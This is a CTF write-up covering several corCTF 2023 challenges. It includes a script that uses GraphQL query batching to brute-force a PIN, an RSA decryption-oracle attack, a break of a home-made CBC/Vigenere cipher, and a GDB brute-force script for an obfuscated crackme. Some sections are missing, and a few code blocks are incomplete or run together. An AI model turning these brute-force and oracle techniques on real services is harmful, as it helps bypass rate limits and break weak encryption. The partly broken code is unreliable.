## Intro
Despite the fact that I couldn't solve more than 5 real challenges during corCTF last year either, it's one of my favorite CTF events, and I played again for this edition, albeit mostly alone. The event was just as hard, if not harder, than last year, and while I didn't have enough time to solve some of the challenges I wanted to, I thought I'd at least writeup the relatively easy challenges that I did do. Got 78th out of ~600+ teams though, which is pretty funny considering I only solved maybe 3 challenges during the event.

### Description
`Unbreakable vault door!`

Author: [larry](https://larry.science/)

### Challenge
We're given source code for this challenge, and it's a very, very minimal web application.

```js
import fastify from 'fastify'
import mercurius from 'mercurius'
import { randomInt } from 'crypto'
import { readFile } from 'fs/promises'

const app = fastify({
    logger: true
});
const index = await readFile('./index.html', 'utf-8');

const secret = randomInt(0, 10 ** 5); // 1 in a 100k??

let requests = 10;

setInterval(() => requests = 10, 60000);

await app.register(mercurius, {
    schema: `type Query {
        flag(pin: Int): String
    }`,
    resolvers: {
        Query: {
            flag: (_, { pin }) => {
                if (pin != secret) {
                    return 'Wrong!';
                }
                return process.env.FLAG || 'corctf{test}';
            }
        }
    },
    routes: false
});

app.get('/', (req, res) => {
    return res.header('Content-Type', 'text/html').send(index);
});

app.post('/', async (req, res) => {
    if (requests <= 0) {
        return res.send('no u')
    }
    requests --;
    return res.graphql(req.body);
});

app.listen({ host: '0.0.0.0', port: 80 });
```

The task is fairly simple. When spawned, the server will choose a random number from 0 to 100,000. Using [GraphQL](https://graphql.org/), a user is able to submit a request using the `flag()` query, and if the numbers match up, it will print the flag. However, you're only allowed 10 requests, meaning if you pick 10 distinct numbers, that is about a 0.01% chance of happening.

We can open the app up to get a better idea of what this looks like.

If I submit this request as is, we're told we have the wrong answer.

![Pasted_image_20230801220316.png](https://an00brektn.github.io/img/cor23/Pasted%20image%2020230801220316.png)

### Solution
If you don't know, [GraphQL](https://graphql.org/) is an open-source querying language for APIs that is not intrinsically tied to any one database or storage engine, the motivation for this being the ability to be highly specific about what data you want to pull. In a more traditional [REST](https://www.ibm.com/topics/rest-apis) API, you have set structures in place to query resources, which is nice because of how easy it is, but not efficient. For instance, a developer might set up an endpoint like `http://example.com/api/v1/users/<ID>` to access information about a user by ID. However, what if you just want the email of that user, or just the registration date? This might not seem like a big problem, but when your user list becomes insanely large, optimization will become necessary.

In GraphQL, we could define our API with certain types and structures, and create a query like so:
```json
query CurrentUser {
	currentUser {
		name
		email
	}
}
```

Now, anytime we call that query, we get the exact data back. When I see GraphQL, my first instinct is to approach it like I would an SQL database. GraphQL features [introspection](https://graphql.org/learn/introspection/), a technique that allows you to use GraphQL queries to get more information about the database schema, and John Hammond shows this off a lot better in a [video](https://www.youtube.com/watch?v=0wPKzinwM7A) on an HTB Business CTF Challenge. However, it won't be very useful here. I can submit the payload from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection), and then use [GraphQLVoyager](https://graphql-kit.com/graphql-voyager/) to visualize this data, but all it returns is a single box.

![Pasted_image_20230801221207.png](https://an00brektn.github.io/img/cor23/Pasted%20image%2020230801221207.png)

If we think about the actual function of GraphQL here, it's not actually storing any data. Although we're allowed to submit arbitrary GraphQL requests to this server there is only one defined query in the source code. `flag` is the only defined query, and when we submit that with a pin, the server receives that number, and compares it with what was stored in memory. TL;DR: There's no way to leak the number out like this.

However, GraphQL was created as a way to hone in API requests, so surely there's a way to make multiple requests in one go? GraphQL actually has [batching](https://stepzen.com/blog/graphql-optimization-part4-batching-combining), meaning we can make multiple queries in a single request to the backend. We can try this with two just to confirm.

```shell
kali@transistor:~/ctf/corctf-23/web_force$ curl -X POST 'https://web-force-force-9676b1ba97b0af6d.be.ax/' -H 'Content-Type: text/plain' -d '{req1: flag(pin: 31337) req2: flag(pin: 420)}' | jq

                                 Dload  Upload   Total   Spent    Left  Speed

{
  "data": {
    "req1": "Wrong!",
    "req2": "Wrong!"
  }
}
```

Nice! Given that there are *100,000* values we need to try, I'll submit them 10,000 at a time so that we don't overload the server.

```python
import hashlib
import requests as r
import sys

URL = sys.argv[1]

def create_payload(lbound, rbound):
    payload = {}
    for i in range(lbound, rbound):
        payload["a" + hashlib.md5(str(i).encode()).hexdigest()] = f"flag(pin: {i})"
    return payload

for i in range(1,11):
    p = str(create_payload((i-1) * 10000, (i)*10000))
    payload = p.replace("', ", "\n").replace("'", "")
    res = r.post(URL, data=payload, headers={"Content-Type":"text/plain;charset=UTF-8"})
    if 'corctf' in res.text:
        #print("DEBUG: " + res.text)
        index = res.text.find("corctf")
        print(res.text[index:index+100])
        break
else:
    print("womp womp, you failed")
```

Running the script, we get our flag:
```shell
kali@transistor:~/ctf/corctf-23/web_force$ python3 solve.py https://web-force-force-9676b1ba97b0af6d.be.ax/
corctf{S                T                  O               N                   K                 S}"
```

**flag:** `corctf{S                T                  O               N                   K                 S}`
This flag is definitely going to break the blog but it's fine.

## fizzbuzz100
> Crypto - 134 solves

### Description
`lsb oracles are pretty overdone... anyway here's fizzbuzz`

Author: [willwam](https://willwam.me/)

### Challenge
We're given source code to a remote server.

```python
#!/usr/local/bin/python
from Crypto.Util.number import *
from os import urandom

flag = open("flag.txt", "rb").read()
flag = bytes_to_long(urandom(16) + flag + urandom(16))

p = getPrime(512)
q = getPrime(512)
n = p * q
e = 0x10001
d = pow(e, -1, (p-1)*(q-1))
assert flag < n
ct = pow(flag, e, n)

print(f"{n = }")
print(f"{e = }")
print(f"{ct = }")

while True:
    ct = int(input("> "))
    pt = pow(ct, d, n)
    out = ""
    if pt == flag:
        exit(-1)
    if pt % 3 == 0:
        out += "Fizz"
    if pt % 5 == 0:
        out += "Buzz"
    if not out:
        out = pt
    print(out)
```

This was the first of a series of three challenges that escalated on the idea of FizzBuzz, a classic [coding interview question](https://www.youtube.com/watch?v=QPZ0pIK_wsc) and game that kids in the UK play (I guess they have nothing better to there). This challenge starts out with a pretty standard RSA implementation to encrypt the flag, this time adding random bytes to the beginning and end of the flag to prevent unintended solutions in the later versions. We're then given access to a decryption oracle, with a twist. We can give it any RSA ciphertext as an integer, and it will use the private key to decrypt it. However, if it's the original flag, the program will exit. Otherwise, if the plaintext is a multiple of 3, the oracle will print "Fizz", a multiple of 5 will print "Buzz", and a multiple of 15 will print "FizzBuzz". If none of these conditions are met, we're given the computed plaintext.

### Solution
Like [last year's corCTF](https://notateamserver.xyz/corctf22/#tadpole), the easiest crypto challenge is a simple case of modular arithmetic. We may not be able to directly submit the ciphertext, but we can always modify it. We know that the ciphertext we receive is $$c \equiv m^e \pmod{n}$$. Now suppose we submit the ciphertext $$c' \equiv 2^e * c \pmod{n}$$. Then, the decryption oracle works out like this:

\\[\begin{aligned} & m' \equiv (c')^d \equiv (2^e * c)^d \equiv (2^e * m^e)^d \equiv 2m \pmod{n} \end{aligned}\\]

We can easily compute the modular inverse of $$2$$ mod $$n$$, so we can multiply that by the output of the decryption oracle to get the flag.

```python
#!/usr/bin/env python3
from pwn import *
from Crypto.Util.number import long_to_bytes

context.log_level = "debug"

def start(argv=[], *a, **kw):
    if args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process(["python3", "fizzbuzz100.py"])
    
io = start()
n = int(io.recvlineS().split('=')[1].strip())
e = int(io.recvlineS().split('=')[1].strip())
ct = int(io.recvlineS().split('=')[1].strip())

io.sendlineafter(">", str((pow(2,e) * ct)%n))
m_prime = int(io.recvlineS().strip())

print(long_to_bytes((m_prime * pow(2, -1, n))%n))
```

### Description
`who on earth is putting CLASSICAL BORING CRYPTOGRAPHY in my ctf`

Author: [willwam](https://willwam.me/)

### Challenge
We're given the output of the below Python program.
```python
import random

def random_alphastring(size):
    return "".join(random.choices(alphabet, k=size))

def add_key(key, block):
    ct_idxs = [(k_a + pt_a) % len(alphabet) for k_a, pt_a in zip([alphabet.index(k) for k in key], [alphabet.index(pt) for pt in block])]
    return "".join([alphabet[idx] for idx in ct_idxs])

def cbc(key, plaintext):
    klen = len(key)
    plaintext = pad(klen, plaintext)
    iv = random_alphastring(klen)
    blocks = [plaintext[i:i+klen] for i in range(0, len(plaintext), klen)]
    prev_block = iv
    ciphertext = ""
    for block in blocks:
        block = add_key(prev_block, block)
        prev_block = add_key(key, block)
        ciphertext += prev_block
    return iv, ciphertext
    
def pad(block_size, plaintext):
    plaintext += "X" * (-len(plaintext) % block_size)
    return plaintext

alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
bs = 16

message = open("message.txt").read().upper()
message = "".join([char for char in message if char in alphabet])
flag = open("flag.txt").read()
flag = flag.lstrip("corctf{").rstrip("}")
message += flag
assert all([char in alphabet for char in message])

key = random_alphastring(bs)
iv, ct = cbc(key, pad(bs, message))
print(f"{iv = }")
print(f"{ct = }")
```

This code might seem a bit complicated with all of the list comprehensions, but the encryption scheme is very simple. Going from top to bottom, the `random_alphastring` function will generate a random string of uppercase English characters with a specified length. The `add_key` function is where the encrypting happens: for each character in the key and the plaintext block, we take the index of the letters, and add them together modulo the length of the alphabet. In this case, A = 0, B = 1, C = 2, etc. So, if we did `add_key("C", "Z")`, that would work out to be $$(2 + 25) \pmod{26} \equiv 1$$, and $$1$$ corresponds to "B". The TL;DR here is that this is basically just a Caesar Cipher, except there is a different shift per character.

The interesting part is the `cbc()` function. In [Three-Eyed Oracle](https://notateamserver.xyz/htb-cyber-apocalypse-crypto-three-eyed-oracle/), I briefly discussed various block cipher modes, and this function is effectively applying [Cipher Block Chaining (CBC)](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC)) mode to this `add_key()` encryption. Normally, CBC looks like this:

![cbc](https://upload.wikimedia.org/wikipedia/commons/thumb/8/80/CBC_encryption.svg/600px-CBC_encryption.svg.png)
<sup>Courtesy: [Wikipedia](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC))</sup>

The basic idea, in its normal use, is that every plaintext is XOR-ed with the previous ciphertext block, and then run through the block cipher. For the first message block, we use a random set of bytes called an Initialization Vector (IV), which helps add to the overall randomness of the encryption. Here, however, the algorithm has been slightly modified.

![Pasted_image_20230802105835.png](https://an00brektn.github.io/img/cor23/Pasted%20image%2020230802105835.png)

Instead of XORs, we're just applying the `add_key()` function again. The only other thing that hasn't been mentioned here is that the plaintext is padded out to a 16 byte boundary using X's as seen in the `pad()` function (e.g. `pad("ABCDEF") = "ABCDEFXXXXXXXXXX"`).

### Solution
The big problem with this script is that the `add_key()` function is fully reversible. In the `add_key()` function, I can just do the reverse of `k_a + pt_a`, which is `pt_a - k_a`, and get back to the original value.

```python
def remove_key(key, block):
    ct_idxs = [(pt_a - k_a) % len(alphabet) for k_a, pt_a in zip([alphabet.index(k) for k in key], [alphabet.index(pt) for pt in block])]
    return "".join([alphabet[idx] for idx in ct_idxs])
```
```python
>>> def add_key(key, block):
...     ct_idxs = [(k_a + pt_a) % len(alphabet) for k_a, pt_a in zip([alphabet.index(k) for k in key], [alphabet.index(pt) for pt in block])]
...     return "".join([alphabet[idx] for idx in ct_idxs])
...
>>> def remove_key(key, block):
...     ct_idxs = [(pt_a - k_a) % len(alphabet) for k_a, pt_a in zip([alphabet.index(k) for k in key], [alphabet.index(pt) for pt in block])]
...     return "".join([alphabet[idx] for idx in ct_idxs])
...
>>> alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
>>> bs = 16
>>> iv = 'RLNZXWHLULXRLTNP'
>>> add_key(iv, "YELLOWSUBMARINEX")
'PPYKLSZFVXXITGRM'
>>> remove_key(iv, add_key(iv, "YELLOWSUBMARINEX"))
'YELLOWSUBMARINEX'
```

This is a good first step; we can easily decrypt any ciphertext knowing the key. That said, we still don't know the key. However, we might not even need the key. Consider the general way to decrypt a block cipher using CBC.

![cbc](https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/CBC_decryption.svg/600px-CBC_decryption.svg.png)
<sup>Courtesy: [Wikipedia](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC))</sup>

Unlike CBC encryption, which can only be done one block at a time because it needs to be chained with the previous ciphertext block, CBC decryption can be done in parallel, as we already know all of the ciphertext. In our case, this means $$m_i = \texttt{remove\_key}(k,\texttt{remove\_key}(c_{i-1}, c_i))$$. Observe that we can actually compute that inner `remove_key()` function, leaving it at a single key being applied to each block: $$m_i = \texttt{remove\_key}(k, c'_i)$$. If this was AES, we'd be stuck, but because the algorithm is basically just a Caesar/Vigenere/Shift cipher, we can crack this using frequency analysis. If you're interested in learning exactly how frequency analysis works here, I recommend looking at [Cryptopals Challenge 6](https://cryptopals.com/sets/1/challenges/6), as they do this with XOR. However, writing your own algorithm to score the "English-ness" of candidate plaintexts can be a bit tedious and error prone, so it's much easier to use someone else's implementation like this [online Vigenere cipher tool](https://www.boxentriq.com/code-breaking/vigenere-cipher#tool).

In summary, to solve this challenge, we can compute $$\texttt{remove\_key}(c_{i-1}, c_i)$$ for every ciphertext block, and then put the resulting "unchained ciphertext" into the Vigenere cipher solver, which should give us the key. The tool I linked didn't apply the key it found to the whole plaintext, so I did that part in Python to get the output.

```python
def remove_key(key, block):
    ct_idxs = [(pt_a - k_a) % len(alphabet) for k_a, pt_a in zip([alphabet.index(k) for k in key], [alphabet.index(pt) for pt in block])]
    return "".join([alphabet[idx] for idx in ct_idxs])

alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
bs = 16
iv = 'RLNZXWHLULXRLTNP'
ct = '[long ciphertext]'

ct_blocks = [ct[i:i+bs] for i in range(0, len(ct), bs)]

unchained = [remove_key(chain, ct) for chain,ct in zip([iv] + ct_blocks[:-1], ct_blocks)]
print("PASTE THIS INTO https://www.boxentriq.com/code-breaking/vigenere-cipher#tool")
print("".join(unchained))

key = "acxqtstcsxzwfczy".upper()

plaintext = []
for chain,ct in zip([iv] + ct_blocks[:-1], ct_blocks):
    block = remove_key(chain, remove_key(key, ct))
    plaintext.append(block)

pt = "".join(plaintext)
print(pt+"\n")
print(f"corctf{{{pt[-47:]}}}")

We don't get much from strings, except what seems to be some messages that the program uses and a fake flag.
```shell
kali@transistor:~/ctf/corctf-23/rev_utterly_deranged$ strings utterlyderanged
<...trim>
Abandon hope all ye who decompile here
Well done for peeling back the layers
Better luck next time :(
p\P~
corctf{notflag}!
<trim...>
```

If we run it, we're given a pretty basic "crackme"-style prompt, albeit with a weird warning. We can also confirm that the fake flag is indeed fake.
```shell
kali@transistor:~/ctf/corctf-23/rev_utterly_deranged$ ./utterlyderanged
Abandon hope all ye who decompile here
: corctf{notflag}

kali@transistor:~/ctf/corctf-23/rev_utterly_deranged$ ./utterlyderanged

```

I can also try to run `strace` and `ltrace`, but nothing much comes of that either.

### Solution
#### Unintended
Most people, including myself, solved it much differently than the author intended. I'll start by walking through how I originally approached this, and then, with knowledge of the challenge post-event, explain why the unintended works and why deobfuscating the binary is pain.

My go-to program for decompilation is Ghidra, and the warning immediately makes sense. After clicking around the identified functions to try and find the entry point or `main`, I found a function that refused to decompile.

If I look at the disassembly in the center window, it's clear something's suspicious. Rather than see a variety of instructions moving values and registers around, I see a repeating pattern for a very long time.

It looks like we're only going to be looking at assembly for this challenge. If I don't have access to a decompiler, my preferred disassembly program is [Rizin's Cutter](https://github.com/rizinorg/cutter), a program that used to just be a frontend GUI for [radare2](https://github.com/radareorg/radare2), but has now evolved into its own ecosystem of tools.

Cutter is actually able to find the main function itself, and pretty easily produce a control flow graph (CFG), things that Ghidra isn't as good at.

![9c2c6499-a3ff-4bdb-8821-2ed0b30b5649.gif](https://an00brektn.github.io/img/cor23/9c2c6499-a3ff-4bdb-8821-2ed0b30b5649.gif)

Oh. That's what they meant in the description. The craziest part about this is that the gif doesn't even do the CFG justice, it just *keeps going*. If we scroll through the disassembly of main, we find some code that resembles what we saw when running the program for the first time

0x00403b77      movaps  xmmword [rax], xmm0
```

From a high level, after printing the "Abandon hope all ye who decompile here", we zero out ~128 bytes of memory at a specified address, and then move data stored at `0x417070` into that buffer. If locate that address, it looks like random bytes, which could very likely be some kind of encrypted text.

Trying to guess some basic XOR keys didn't work, so we'll have to keep looking at the program. This is where the unintended path begins. During the CTF, I wasn't really able to gather much from the obfuscated assembly, aside from the fact that it was doing basically nothing. I assumed that the real instructions were interspersed throughout the obfuscated/garbage assembly, so trying to actually deobfuscate the program would be a challenge. However, if we go to the end of the program, we see a very important function call.

[`memcmp()`](https://www.tutorialspoint.com/c_standard_library/c_function_memcmp.htm) will just compare the bytes located at two blocks of memory up to a specific length. If the `memcmp()` returns true, then "Well done for peeling back the layers" is printed, otherwise, we get the "Better luck next time" message. If we open the program in GDB, we can actually see exactly what's being compared. I'll submit a random flag that's 128 bytes long, since that's the length parameter being passed into `memcmp()`.

In the DISASM part of the output, we can see the addresses of the two blocks being compared, `0x7fffffffb3a0` and `0x7fffffffb310`. Note that these values are stored in the RDI and RSI, respectively. If we inspect memory at both of those points, it seems like one of these buffers is the random bytes we saw from earlier, and the other is what seems to be our input, but encrypted.

See how the bytes in the second buffer exactly line up with what we saw in the hexdump earlier? As for the first buffer, notice that the first 7 bytes and the last byte match the second buffer. Those bytes in our plaintext are `corctf{` and then the `}`. This likely means that there's some kind of XOR cipher at play here. Unfortunately, we already tried doing some guessing earlier and couldn't find the key. In many cases, we wouldn't be able to progress much further here. However, notice what happens when I submit `corctf{BAAAAAA...}` instead of `corctf{AAAAAAA...}`.

By changing one character, only one byte in our ciphertext changed (look at the 8th byte, the top right of the first buffer)! Knowing this, we can write a script to repeat this process that we're doing to gradually brute force each character of the flag. I know other people solved this using [`angr`](https://github.com/angr/angr), but I found it easier to use gdb's Python scripting capabilities. This video from [SloppyJoePirates](https://www.youtube.com/watch?v=6rp5yPLAU_U) helped me get a better grasp on some of the syntax used to script this stuff, but my final GDB script looks like this.

```python
import gdb

gdb.execute("break *0x0041687c")

known_prefix = "corctf"
flag_len = 128
i = 0
while len(known_prefix) < flag_len:
    if '}' in known_prefix:
        print(known_prefix)
        break
    
    for char in range(0x21, 0x7e + 1):
        test_prefix = known_prefix + chr(char)
        test_prefix += "x" * (128 - len(test_prefix)) + "\n"

        with open("attempt.txt", "w") as fd:
            fd.write(test_prefix)

        #print(chr(char), test_prefix)
        gdb.execute("set args")
        gdb.execute("run < attempt.txt >/dev/null")
        
        frame = gdb.selected_frame()
        rdi = hex(frame.read_register("rdi"))
        rsi = hex(frame.read_register("rsi"))

        # guess one, rdi
        guess = gdb.execute(f"x/1bx ({rdi} + {hex(len(known_prefix))})", to_string=True)
        # good one, rsi
        good = gdb.execute(f"x/1bx ({rsi} + {hex(len(known_prefix))})", to_string=True)

        guess_hex = guess.split(':')[1].strip()
        good_hex = good.split(':')[1].strip()
        print(chr(char), test_prefix, good_hex, guess_hex)

        if guess_hex == good_hex:
            known_prefix += chr(char)
            break
    else:
        print("womp womp")
        raise Exception
```

The script honestly isn't as complicated as I thought it would be. We can run gdb commands using `gdb.execute()`, the `to_string` parameter can be used to save the output which can be parsed later, and there's some additional work you can do to read the registers. There's definitely more documentation out there for this. 

To run the script, we simply enter the GDB prompt, and then run `source solve.py`.

#### Failing to Deobfuscate
This was a funny interaction after everyone telling clubby about the unintended.
![Pasted_image_20230802144650.png](https://an00brektn.github.io/img/cor23/Pasted%20image%2020230802144650.png)

After the CTF was over, clubby shared what the source code was, mentioning that most of the effort went into modifying the compiler to obfuscate the code.

```c
#include "salsa20/salsa20.h"
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#define BUFSIZE 128

int main(int argc, char **argv) {
  uint8_t key[16] = {0};
  uint8_t nonce[8] = {0};

  puts("Abandon hope all ye who decompile here");
  uint8_t pt[BUFSIZE] = {0};
  const char ct[BUFSIZE] = {
      0xf3, 0x63, 0xe9, 0x5c, 0xae, 0x07, 0xe8, 0xda, 0x70, 0x5c, 0x50, 0x7e,

      0x06, 0x2c, 0x17, 0x9d, 0x50, 0x7e, 0xd5, 0xe9, 0xfd, 0x89, 0xfa, 0x3c,
      0x28, 0xef, 0x3d, 0xb8, 0x09, 0xf1, 0x53, 0x79, 0xb4, 0xa1, 0xb7, 0x28,
      0xd0, 0x88, 0x80, 0x76, 0x54, 0xa1, 0xed, 0x1b,
  };
  printf(": ");
  fgets((char *)pt, BUFSIZE, stdin);
  char *end;
  if ((end = strchr((char *)pt, '\n'))) {
    *end = 0;
  }

  s20_crypt(key, S20_KEYLEN_128, nonce, 0, pt, BUFSIZE);
  if (memcmp(pt, ct, BUFSIZE) == 0) {
    puts("Well done for peeling back the layers");
  } else {
    puts("Better luck next time :(");
  }

}
```

Surprisingly, in my analysis, I managed to identify most of these things. What I originally thought was a simple XOR cipher was actually a stream cipher (Salsa20), and is integral to why the unintended works. On this blog, we've mentioned AES a few times, which is basically *the* **block cipher** that everyone uses today. A block cipher is exactly what it sounds like, a cipher that works on blocks, more specifically, consistently sized groups of bytes. AES will encrypt the first 16 bytes, then the next 16, and so on until it's done. In addition to this, pretty much every strong block cipher is designed so that a small change in the block will produce a completely different ciphertext. This concept goes by a lot of names, the [Avalanche effect](https://en.wikipedia.org/wiki/Avalanche_effect), [confusion and diffusion](https://en.wikipedia.org/wiki/Confusion_and_diffusion), etc. but the core idea is not wanting to leak anything from the result of minor changes.

```python
>>> from Crypto.Cipher import AES
>>> from os import urandom
>>> key = urandom(16)
>>> pt1 = b'A'*16
>>> pt2 = b'A'*15 + b'B'
>>> cipher = AES.new(key, AES.MODE_ECB)
>>> cipher.encrypt(pt1).hex()
'89317e985e052b9f9a67b27e916e67d1'
>>> cipher.encrypt(pt2).hex()
'dcdfee0e41d5b83dce1595903d1473ff'
```

Secure stream ciphers also incorporate these principles, but they apply them differently. **Stream ciphers** work by using the key to generate a series of random bytes and then proceeding to combine that keystream with the plaintext, most commonly via XOR. It's effectively a weaker, but more practical [one-time pad](https://en.wikipedia.org/wiki/One-time_pad). Salsa20 is one of the more popular stream ciphers today, and while it's a more recently published cipher (published in 2007 compared to 1998 for AES), Salsa is not considered weak.

Looking back at the source code, it is definitely a bad move to make the key and nonce an array of nothing. However, this isn't the crux of the problem. Since Salsa's randomness is coming from the way the keystream is generated, and not the actual manipulation of the plaintext, no matter how the key or nonce was set, the encryption can be simplified to XOR with an unknown key, which we can easily bruteforce. 

In an alternate world where clubby understands how Salsa20 works, the intended is as brutal as it sounds: deobfuscate the binary. Even though clubby confirmed that there was compiler-level obfuscation, we already suspected such a thing from the assembly. Let's take a closer look at an example of these unnecessary instructions.

```c
0x00403d41      mov     rax, rsp
0x00403d44      add     rax, 0xfffffffffffffff0
0x00403d48      mov     rsp, rax
0x00403d4b      shr     rax, 0x3f
0x00403d4f      xor     al, 0xff   ; 255
0x00403d51      test    al, 1      ; 1
0x00403d53      jne     0x403d5a
0x00403d55      jmp     0x416952
0x00403d5a      mov     rax, rsp
0x00403d5d      add     rax, 0xfffffffffffffff0
0x00403d61      mov     rsp, rax
0x00403d64      shr     rax, 0x3f
0x00403d68      xor     al, 0xff   ; 255
0x00403d6a      test    al, 1      ; 1
0x00403d6c      jne     0x403d73
0x00403d6e      jmp     0x416952
0x00403d73      mov     rax, rsp
```

The reason these instructions are useless is because they're blatantly redundant. After moving the value of RSP into RAX, we add a huge hex value to it, move that value back, do a right bitshift of `0x3f` bits, and simply test if the lowest 8 bits are equal to 1. If it's not, continue with the execution of the program, otherwise, exit. The program is simply guaranteed to operate as normal, but is forced to run through all of these instructions.

If we reverse engineer the actual challenge by looking at the flag, these bits of assembly are called **opaque predicates**. A [blog post](https://binary.ninja/2017/10/01/automated-opaque-predicate-removal.html) from [Binary Ninja](https://binary.ninja) (CTF sponsors, who would have guessed), defines them as "a series of instructions which always evaluate to the same boolean result". The impact on performance is rather minimal, but, as we've seen, they're very effective at making static analysis tools like Cutter or Ghidra waste time analyzing code that doesn't really matter. Doing some more searching on the topic, there is actually a good amount of academic literature on the subject, like this [paper](https://faculty.ist.psu.edu/wu/papers/opaque-isc16.pdf) or this [thesis](https://th0mas.nl/downloads/thesis/thesis.pdf).

Now, the Binary Ninja blog only highlights their tool, which is expensive and inaccessible to me, and most of the academic papers don't really provide concrete deobfuscators. Unfortunately, I wasn't able to find a neat and clean way to deobfuscate the binary without breaking many other things. I've spent at least 6-8 hours outside of the CTF to try and upsolve this without abusing the `memcmp()`, but I truly haven't found a solution, and am looking forward to reading anyone's solution that manages to get through this mess of a binary.

Although only 89 teams managed to solve this challenge, it's much simpler than you think it is.

Go outside. Touch grass. Realize that you forgot to write the code on a paper to take the photo. Decide not to go back inside. Take in the fresh air. Be relieved you're not looking at clubby's monstrosity of a program. Lie down. Appreciate what little time we have on this planet. Sleep. Maybe you don't need to slave over these challenges until 2 am. Maybe it's time to really become an outdoors person and embrace what the Earth has to offer. Maybe the true solution all along was-

Ah, you forgot to take the photo didn't you? Just follow the instructions and touch grass lmao.
